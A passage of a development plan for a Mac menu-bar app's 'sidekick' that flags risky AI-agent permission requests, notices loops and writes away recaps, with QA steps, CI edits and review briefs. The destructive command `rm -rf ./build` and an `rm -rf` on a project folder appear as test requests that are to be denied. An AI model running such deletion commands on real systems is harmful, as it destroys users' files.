1. **A high-risk request.** The island opens on the permission card for `rm -rf ./build`. Wait 3 s, `shot 36-sidekick-risk`. Check: under the command one grey line (`Deletes build and everything inside it.`), an orange `High risk` capsule at the right end of the first row, and Deny, Allow and Always as in step 5. **Click Deny** (never Allow), wait 3 s.
2. **A loop.** Run `python3 scripts/fake-sidekick-events.py --scenario loop --speed 4`. The fourth identical step opens the island on a note. `shot 37-sidekick-loop`. Check: `Going in circles`, `Claude Code has run the same step 4 times.`, `Not now` and `Show me`. Click `Not now`. The island folds.
3. **Clean up.** Run `python3 scripts/fake-sidekick-events.py --scenario end`: it ends the fake session.

Pass: every check above holds.

## Screenshots

````

**Edit `docs/QA-MAC.md`** (the find text occurs exactly once)

Find:

```markdown
| `34-desktop-idle-out` | the cat on the desktop and no island at the notch |
| `35-hidden` | no island at the notch, the cat home |

## The report
```

Replace with:

```markdown
| `34-desktop-idle-out` | the cat on the desktop and no island at the notch |
| `35-hidden` | no island at the notch, the cat home |
| `36-sidekick-risk`, `37-sidekick-loop` | the permission card with its grey line and badge, and the loop note |

## The report
```

**Edit `docs/QA-MAC.md`** (the find text occurs exactly once)

Find:

```markdown
| 11 | ten-minute sleep | SKIPPED | no shortened timer |
| 12 | the desktop cat: out, watching, dragged, alert, home, ⌃⌥D, menu, the switch at each point | | the shots 21–33, the card text, the contents of desktop-approval.out |
| 13 | idle CPU, cat out and cat home, island hidden | | the six readings |
| 14 | quit, settings restored | | |
```

Replace with:

```markdown
| 11 | ten-minute sleep | SKIPPED | no shortened timer |
| 12 | the desktop cat: out, watching, dragged, alert, home, ⌃⌥D, menu, the switch at each point | | the shots 21–33, the card text, the contents of desktop-approval.out |
| 15 | the sidekick: the risk line and badge, a loop note | | the shots 36 and 37 |
| 13 | idle CPU, cat out and cat home, island hidden | | the six readings |
| 14 | quit, settings restored | | |
```

- [ ] **Step 4: One CI step for each new script**

**Edit `.github/workflows/build.yml`** (the find text occurs exactly once)

Find:

```yaml
        run: bash scripts/test-fake-terminal-events.sh

      - name: Desktop cat settings (screens, spots and the stored block against desktop-cases.json)
        run: bash scripts/test-cat-desktop-settings.sh
```

Replace with:

```yaml
        run: bash scripts/test-fake-terminal-events.sh

      - name: Sidekick risk rules (explain-cases.json)
        run: bash scripts/test-sidekick-explain.sh

      - name: Sidekick hook adapter and ledger (hook-cases.json)
        run: bash scripts/test-sidekick-ledger.sh

      - name: Sidekick stuck rules (stuck-cases.json)
        run: bash scripts/test-sidekick-stuck.sh

      - name: Sidekick recap, status answer and status question (recap-cases.json, status-cases.json)
        run: bash scripts/test-sidekick-recap.sh

      - name: Sidekick dismissals, settings and store (dismiss-cases.json, settings-cases.json)
        run: bash scripts/test-sidekick-settings.sh

      - name: Sidekick presence, flags, idle sample and show gate (presence-cases.json, show-cases.json)
        run: bash scripts/test-sidekick-presence.sh

      - name: Sidekick notes and the one clock
        run: bash scripts/test-sidekick-notes.sh

      - name: Sidekick local voice (voice-cases.json, fake providers)
        run: bash scripts/test-sidekick-voice.sh

      - name: Sidekick engine (scripted runs with a clock and a timer by hand)
        run: bash scripts/test-sidekick-engine.sh

      - name: Sidekick drop on an agent's own cat
        run: bash scripts/test-sidekick-drop.sh

      - name: Sidekick leak test (a marker never reaches a log or a non-local provider)
        run: bash scripts/test-sidekick-leak.sh

      - name: Sidekick wiring (source pins of the app files)
        run: bash scripts/test-sidekick-wiring.sh

      - name: Fake sidekick session (the owner's script, sent to a test socket)
        run: bash scripts/test-fake-sidekick-events.sh

      - name: Desktop cat settings (screens, spots and the stored block against desktop-cases.json)
        run: bash scripts/test-cat-desktop-settings.sh
```

- [ ] **Step 5: Check the docs and the CI file**

Run: `grep -c "test-sidekick-" .github/workflows/build.yml; grep -c "fake-sidekick" .github/workflows/build.yml; bash scripts/check-no-leftovers.sh 2>&1 | tail -2`
Expected: `13`, `1` and the leftovers guard's `✓` lines (no `mochi`, no `BotEngine`, no dead cat code: the new files add none).

Run: `python3 -c "import yaml,sys; yaml.safe_load(open('.github/workflows/build.yml')); print('build.yml parses')" 2>&1 | tail -1`
Expected: `build.yml parses` (if `yaml` is not installed, `ruby -ryaml -e 'YAML.load_file(".github/workflows/build.yml"); puts "build.yml parses"'` does the same).

- [ ] **Step 6: Commit**

```bash
git rev-parse --show-toplevel && git branch --show-current   # the worktree's folder and f1/mac-sidekick: stop if either is wrong
MSG="$(mktemp "${TMPDIR:-/tmp}/f1-mac-msg.XXXXXX")"
cat > "$MSG" <<'EOF'
docs(sidekick): the owner's fake events, the Mac's sidekick in the docs, and one CI step for each new script

scripts/fake-sidekick-events.py sends scripted sessions to a running Debug build (its test uses a socket of its own); CLAUDE.md, ARCHITECT.md, the roadmap, the French spec, INTEGRATIONS.md and QA-MAC.md say what is built; the Build workflow runs the sidekick tests and the script's test.

Co-Authored-By: Claude Haiku 5.5 <noreply@anthropic.com>
EOF
git add scripts/fake-sidekick-events.py scripts/test-fake-sidekick-events.sh CLAUDE.md ARCHITECT.md README.md docs/SPEC.md docs/INTEGRATIONS.md docs/QA-MAC.md .github/workflows/build.yml
git commit -F "$MSG"
```

---

### Task 21: Owner checkpoint 2: a recap, a nudge and the status answer in a scripted run

**Agent:** the session, then the main session and the owner. No code and no commit. Tasks 17 to 20 are done.

- [ ] **Step 1: Run the scripted flows and keep their output**

The engine's test **is** the scripted run: each section below it is one flow the owner will see on a real build, played with a clock by hand and the hook events of a made-up session, and what it prints is the story in order.

```bash
mkdir -p .claude/checkpoints/f1-mac
bash scripts/test-sidekick-engine.sh > .claude/checkpoints/f1-mac/engine-run.txt 2>&1; tail -1 .claude/checkpoints/f1-mac/engine-run.txt
bash scripts/test-sidekick-leak.sh > .claude/checkpoints/f1-mac/leak-run.txt 2>&1; tail -1 .claude/checkpoints/f1-mac/leak-run.txt
for s in loop risk away; do python3 scripts/fake-sidekick-events.py --scenario "$s" --print > ".claude/checkpoints/f1-mac/fake-$s.txt"; done; wc -l .claude/checkpoints/f1-mac/fake-*.txt
```

Expected: two lines `All tests passed.`, then three line counts (the loop prints 12 lines, the risk scenario 6, the away scenario 22 for the default three minutes).

- [ ] **Step 2: Draw the notes and the settings again from the final code, and collect the pictures**

```bash
P="${TMPDIR:-/tmp}/f1-mac-2"; mkdir -p "$P"
bash scripts/render-sidekick.sh --out "$P/sidekick-notes.png" --settings-out "$P/sidekick-settings.png"
bash scripts/render-approval-card.sh --out "$P/approval-high.png" --command "rm -rf ./build" --risk high --line "Deletes build and everything inside it."
cp "$P"/*.png .claude/checkpoints/f1-mac/
```

Each ends `wrote …` (about two minutes each).

- [ ] **Step 3: Run every sidekick test and the neighbours' once more, and build the three builds**

```bash
for f in scripts/test-sidekick-*.sh scripts/test-fake-sidekick-events.sh scripts/test-cat-desktop-wiring.sh scripts/test-hook-origin-wiring.sh scripts/test-hook-origin.sh scripts/test-cat-wiring.sh scripts/test-island-wing-wiring.sh scripts/test-island-poller.sh scripts/test-shortcuts.sh scripts/test-hotkeys.sh scripts/check-test-logs.sh scripts/check-no-leftovers.sh; do printf '%-44s' "$f"; bash "$f" 2>&1 | tail -1; done
```

Expected: the 25 lines each end `All tests passed.` (or their own counts, `Shortcuts: 523 cases passed`, `HotKeyCenter: 19 cases passed`, `IslandPoller: visible 59 Hz, hidden 10 Hz, shown again 60 Hz`, the leftovers guard's last `✓`, `✓ every log-writing test script sets NM_LOG_DIR`, and `✓ two generator runs write identical bytes` for the contract). Then the three builds and `check-app-binary.sh` of Task 19, Step 4.

- [ ] **Step 4: Stop and report to the main session**

Report: the commits; the test lines; the three build lines and the three binary checks; the paths of `engine-run.txt`, `leak-run.txt`, `fake-loop.txt`, `fake-risk.txt`, `fake-away.txt` and the PNGs, with one sentence on each; and anything not settled. **The session never launches an app:** the owner can build the Debug app from the worktree and open it themselves, then run `python3 scripts/fake-sidekick-events.py --scenario loop` (and `risk`, and, with the Mac locked for a few minutes, `away`). Then **stop**; the owner's reply comes before Task 22.

**What the owner looks at:**
1. `engine-run.txt`: the recap after a lock says `While you were away, Claude Code in proj ran 2 steps, edited a.js, and finished.`; two dismissals mute it and Unmute brings it back; a loop of four gives `Claude Code has run the same step 4 times.` once; the waiting nudge shows at 60 s and its words change at 115 s; a note held while the user types is dropped silently after 30 s; with no agent no timer is set.
2. `leak-run.txt`: the five promises, each a `✓`.
3. The pictures: the card with its line and badge, the notes, the Settings section.
4. `fake-away.txt`: the owner's own way to see the recap: lock the Mac, run the script, unlock when it says.

---

### Task 22: The whole branch reviewed (privacy first), then owner checkpoint 3 and the owner's real-build checks

**Agent:** `nm-reviewer-deep` (**Sonnet 5.5, high: CLAUDE.md trigger 4**, a whole-branch review and a privacy review), then the main session and the owner.

- [ ] **Step 1: Dispatch the whole-branch review**

The controller dispatches `nm-reviewer-deep` over `git diff notchmeow/rebrand...HEAD` (three dots) with the skills `ponytail:ponytail-review` and `superpowers:requesting-code-review`, and a brief that carries this plan, the spec, the contract and this list, in this order:

1. **Privacy first (trigger 4).** Read `tests/SidekickLeakTests.swift`, then everything a hook payload touches after `Sidekick.shared.feed`: does any path keep a prompt, an assistant message, `transcript_path`, a full path, a command or a file's contents (the ledger's event has `target`, `file`, `key`, `project`; a line holds a basename and a count)? Is anything logged (`grep -rn "appendAppLog\|nbLog\|print(\|NSLog" NotchBuddy/Sources/App/Sidekick*.swift NotchBuddy/Sources/App/PresenceMonitor.swift NotchBuddy/Sources/App/AgentTarget.swift`)? Can any request reach a non-local model (`SidekickVoiceApp`, `SidekickVoiceLocal`, `SidekickChat`)? Is the status answer ever part of what a provider receives?
2. **It labels and never decides.** Can any code of the sidekick answer a permission request, write to a socket or change `pendingApproval`? Is the badge a button? Is a request ever approved without the user's click?
3. **Cross-task contracts:** `SKNote.rows` against the card's 98 pt; the engine's `Env` against `Sidekick`'s closures; `FileDropNSView`'s order of the drop rules against G1's Ask and Shelf halves (already in the base, `ShelfDrop.swift`); `PresenceMonitor` against `DesktopCatController`'s old observers (the OR of the screen lock and the session switch is intended); the wall-clock one-shot across a sleep; `evaluate`'s re-entrancy.
4. **0 % CPU hidden:** is there any new timer, monitor or poll? (`Sidekick.tick()` is on `IslandPoller`'s own tick and returns before it does work when nothing is due.)
5. **Never restyle:** the diff of `IslandViewContent.swift`, `IslandTypes.swift`, `IslandRootView.swift`, `PairCatViews.swift`, `BotCanvasView.swift`, `SettingsView.swift` and `FileDropView.swift` shows only the additions the plan names.
6. **The Review Focus lines** at the top of this plan, each against its test.

The reviewer is read-only and reports findings with file and line. The controller fixes each (a fix is a new commit that names the finding, reviewed by `nm-reviewer`), runs the tests of the files it touched and the whole sweep of Task 21 Step 3, and asks `nm-reviewer-deep` for a scoped re-review of the fixes.

- [ ] **Step 2: Report and stop**

Report: the reviewer's findings and what was done about each, the final test sweep and the builds, and anything not settled. Then **stop**: the main session double-checks the branch in its own clone before anything reaches the owner.

- [ ] **Step 3: Owner checkpoint 3: sign-off and the real-build checks**

The owner builds the Debug app from the branch (never over the installed one) and checks, by hand. Each line says what to do and what to see:

1. **Lock and unlock after a run.** In a Claude Code session in a terminal, give it a task that edits two files, lock the Mac (⌃⌘Q) for more than 2 minutes, unlock. *The island opens once on a note that starts `While you were away,` and names the project and the files.* OK it. Lock again for 3 minutes and unlock: a second recap. OK it. Do it a third time: *no recap* (two dismissals muted it). Settings → Sidekick shows `Away recaps` with Unmute; press it: the next return shows a recap again. (Or use `python3 scripts/fake-sidekick-events.py --scenario away` while locked.)
2. **A high-risk request.** Ask the agent to run `rm -rf` on a folder of the project. *The card has a grey line (`Deletes … and everything inside it.`) and an orange `High risk` capsule, and the cat jumps once.* Deny it. A `git push` request shows the grey line and no badge.
3. **A deliberate loop.** Make the agent repeat one command four times (or `python3 scripts/fake-sidekick-events.py --scenario loop`). *A note: `Going in circles`.* `Show me` brings the terminal forward; the same session gets no second nudge.
4. **A long wait on an approval.** Let a request wait with the island on another view (open the chat, say). *After a minute a note says `Claude Code is still waiting for your OK.`* Past the app's give-up time (115 s) its words change to `…waiting for your OK in the terminal.`
5. **Typing is never covered.** Start typing in the chat and let a nudge fall due. *Nothing opens over the chat;* it is dropped after 30 s without a trace.
6. **The status question on a cloud chat.** Choose a cloud model in the chat, turn Wi-Fi off, ask `What's Claude doing?` (and press the chip in an empty chat). *The answer comes at once, under it `From NotchMeow, on this Mac`,* and a real question that contains the words (`what's claude doing wrong with my build?`) still goes to the model and fails offline as it always did.
7. **A file on an agent's own cat.** In **A cat for each agent**, with two agents running, drag a file from Finder onto one agent's cat in the compact island: *a thin ring on that cat, the island does not open its drop view, the line `Copied the path — paste it into …`, the agent's app comes forward, the cat is happy; paste into the agent: the file's original path.* Do the same on the second agent's cat. In **Two cats**, the same on cat 2. Drop the same file on the **big cat**: *the chat's drop, exactly as before.* Drop on an agent's cat whose agent has no session: *the drop is the normal one.*
8. **The rest is as it was.** The desktop cat still hides on lock and when the displays sleep; the island's hover, the greeting and the approval buttons are unchanged; and Activity Monitor with the island hidden and an agent idle for a minute still reads about 0 % for NotchMeow.
9. **The App Store build** (the Debug build of the `NotchMeowAppStore` scheme, with the owner's own signing): the same checks 2, 6 and 7 (the path is copied and VS Code comes forward; no other app), and no Codex route.

Sign-off: the owner replies with what to change (the note's wording, the rows' look, a threshold) and whether the branch may be merged by the main session. Nothing is pushed.

---

## Parity with Windows and Linux

The Windows and Linux twin (`windows/`, the Tauri plan `2026-10-14-f1-tauri-sidekick.md`) ports the same contract against the same fixtures. The Mac has at least what it has (CLAUDE.md, "Mac is primary"), plus these Mac-only things: the idle sample through `CGEventSource` (the twin uses its own source), the drop on an agent's cat (the twin's drop rules differ), the local voice on Apple's on-device model, and the owner's `fake-sidekick-events.py`. Nothing in this plan edits `windows/`. If the contract changes, `shared/sidekick-core.js` decides and both ports re-run their fixtures.

## Self-review

- **Spec coverage.** Ports (Tasks 1 to 8) cover explain, eventFrom and the ledger, stuckStep, recap, status and matcher, dismissals and settings, presence and the gate, `acceptNicerLine`. Ledger feed before the pending-approval gate: Task 10. Card line, badge and `surprised`: Task 11. Shared `PresenceMonitor`, no new polling: Task 12. One-shot clock: Task 7 and Task 13. `.sidekick` via the existing peek: Task 13. Settings: Task 15. Local voice only: Tasks 8 and 14. Status answered locally: Task 17. Agent-cat drop with the big cat unchanged and a hook point for G1: Task 18. Leak test, App Store parity, fake events: Tasks 19 and 20. Checkpoints: 16, 21, 22.
- **Placeholders.** None: every code step is a full file or an Edit with an exact find text; the dry run applied each one.
- **Types.** Names were taken from the applied code (`SKNote.rows`, `Sidekick.marker`, `AgentTarget.bringForward`, `SidekickStore(backing:)`) and the wiring tests pin the call sites.
- **Review Focus.** Each of the six lines names the task whose test pins it.

## Dry run

The plan was applied task by task, with every command run, in a throwaway clone of the base (`notchmeow/rebrand` at `a5d9066`: `mac/all-terminals` and G1's shelf merged). Nothing was committed. What it proved and changed:

- All pure ports pass F1-0's fixtures (554 explain cases, 52 hook payloads and 19 sequences, 40 stuck timelines, 27 recap cases, 12 status cases, 31 matcher messages, 9 dismissal cases, 17 settings cases, 19 presence cases, 43 gate cases, 39 voice cases).
- Debug, Release and App Store builds, and the three binary checks, pass with the marker `NM_SIDEKICK_ENGINE_PRESENT` in all three. The Release build first dropped the marker as an unused constant; the note view now uses it as its accessibility identifier.
- The pictures render: the approval card with its line and badge, four notes and Settings → Sidekick. A four-line recap first overflowed the card; `SKNote.rows` caps it at 3 rows.
- Existing wiring tests needed new pins where code moved (`HookOriginWiringTests`, `DesktopCatWiringTests`); the plan edits them.
- Pre-existing failure, not caused by this plan: `scripts/test-config-file-write.sh` fails when `TMPDIR` is under `/private/tmp`. Task 0 notes it.

## The owner's answers (2026-10-14)

The plan's open questions were answered; the plan above is written to these answers.

1. **A recap longer than the card** is cut with "…" at 3 rows (`SKNote.rows`); the card stays a fixed 98 pt of content.
2. **After a drop on an agent's cat** a short `.sidekick` note says `Copied the path — paste it into <agent>`. The AI error `.note` view is not used.
3. **The chat chip** ("What's Claude doing?") is drawn only while an agent has a live session (Task 17: `SidekickStatusChip` checks `Sidekick.shared.liveAgents`).
4. **A nudge counts as given only once it was actually shown.** The contract leaves the call to `markNudged` to the app (`stuckStep` only skips a session that has `nudgedAt`), and `SidekickEngine` records it right after the note is presented (Task 9). A nudge held and dropped without showing is offered again; one held note per session and kind.
5. **Overview cats are not drop targets.** Only the compact grid's agent cats (A cat for each agent mode) and cat 2 (Two cats mode) take an agent drop.
6. **Lock and user switch both mean away**: one flag, as built (`SKPresenceFlags`, Task 6; `PresenceMonitor`, Task 12).
7. **G1 is in the base** (`a5d9066`): the agent-cat test runs first in every drag callback of `FileDropNSView`, and G1's Ask and Shelf halves apply only to what it does not take (Task 18).
8. **Wording** of the notes is the contract's templates; changes go to `shared/sidekick-core.js` in F1-0, never here.
